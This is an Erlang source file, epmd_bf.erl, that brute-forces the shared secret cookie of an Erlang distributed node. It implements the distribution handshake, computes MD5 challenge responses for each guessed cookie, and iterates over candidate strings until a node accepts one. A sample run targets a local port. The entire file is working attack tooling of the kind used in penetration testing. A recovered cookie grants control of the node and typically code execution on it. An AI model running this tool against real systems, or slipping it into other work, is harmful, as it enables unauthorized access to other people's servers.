%  epmd_bf.erl
%  
%  Copyright 2017 Daniel Mende <mail@c0decafe.de>
%  
%  Redistribution and use in source and binary forms, with or without
%  modification, are permitted provided that the following conditions are
%  met:
%  
%  * Redistributions of source code must retain the above copyright
%    notice, this list of conditions and the following disclaimer.
%  * Redistributions in binary form must reproduce the above
%    copyright notice, this list of conditions and the following disclaimer
%    in the documentation and/or other materials provided with the
%    distribution.
%  * Neither the name of the  nor the names of its
%    contributors may be used to endorse or promote products derived from
%    this software without specific prior written permission.
%  
%  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
%  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
%  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
%  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
%  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
%  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
%  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
%  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
%  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
%  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
%  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

-module(epmd_bf).
-author('Daniel Mende <mail@c0decafe.de>').
-compile(export_all).

-include_lib("kernel/include/dist.hrl").

get_next(_, [_|[]]) ->
    stop;
get_next(Cur, [H|T]) ->
    if
        Cur == H ->
            lists:nth(1, T);
        true ->
            get_next(Cur, T)
    end.

next([], Alphabet) ->
    lists:nth(1, Alphabet);
next([H|T], Alphabet) ->
    case get_next(H, Alphabet) of
        stop ->
            [lists:nth(1, Alphabet) | next(T, Alphabet)];
        Next ->
            [Next | T]
    end.
    
gen_digest(Challenge, Cookie) when is_integer(Challenge), is_list(Cookie) ->
    erlang:md5([list_to_binary(Cookie)|integer_to_list(Challenge)]).

test_cookie({IP, Port}, Cookie) ->
    test_cookie({IP, Port}, Cookie, <<"epmd_bf@baldr.local">>).
test_cookie({IP, Port}, Cookie, NodeName) ->
    io:fwrite("Testing cookie ~s~n", [Cookie]),
    {ok, Socket} = gen_tcp:connect(IP, Port, [
            {packet, 2},
            {active, true},
            {nodelay, true},
            {reuseaddr, true},
            binary
        ]),
    Identification = <<
        "n",
        0,5,            % Version
        0,7,127,253,    % Flags
        NodeName/bytes  % NodeName
    >>,
    ok = gen_tcp:send(Socket, Identification),
    receive
        {tcp, _, <<"sok">>} -> 
            receive 
                {tcp, _, <<"n", _Version:16, _Flags:32, Challenge:32, Name/binary>>} -> 
                    %~ io:fwrite("Received Challenge ~p from ~s~n", [Challenge, Name]),
                    Digest = gen_digest(Challenge, Cookie),
                    ChallengeReply = <<
                        "r",
                        0,0,0,0,    % Challenge
                        Digest/bytes
                    >>,
                    ok = gen_tcp:send(Socket, ChallengeReply),
                    receive
                        {tcp_closed, _} ->
                            failed;
                        {tcp, _, <<"a", _/binary>>} ->
                            io:fwrite("Found cookie ~s for host ~s~n", [Cookie, Name]),
                            success;
                        Ret ->                            
                            io:fwrite("Received ~p~n", [Ret]),
                            error
                    end;
                Ret ->
                    io:fwrite("Received ~p~n", [Ret]),
                    error
                end;
        _ -> error
    end.

gen_first(N, Alphabet) ->
    gen_first(N, N, Alphabet).
gen_first(_, 0, _) ->
    [];
gen_first(N, C, Alphabet) ->
    [lists:nth(1, Alphabet) | gen_first(N, C-1, Alphabet)].

bf_cookie({IP, Port}, Alphabet, Cookie) ->
    case test_cookie({IP, Port}, Cookie) of
        success -> 
            stop;
        failed ->
            bf_cookie({IP, Port}, Alphabet, next(Cookie, Alphabet));
        _ ->
            stop
    end.

test() ->
    Alphabet = lists:seq($A,$Z),
    bf_cookie({{127,0,0,1}, 37453}, Alphabet, gen_first(20, Alphabet)).
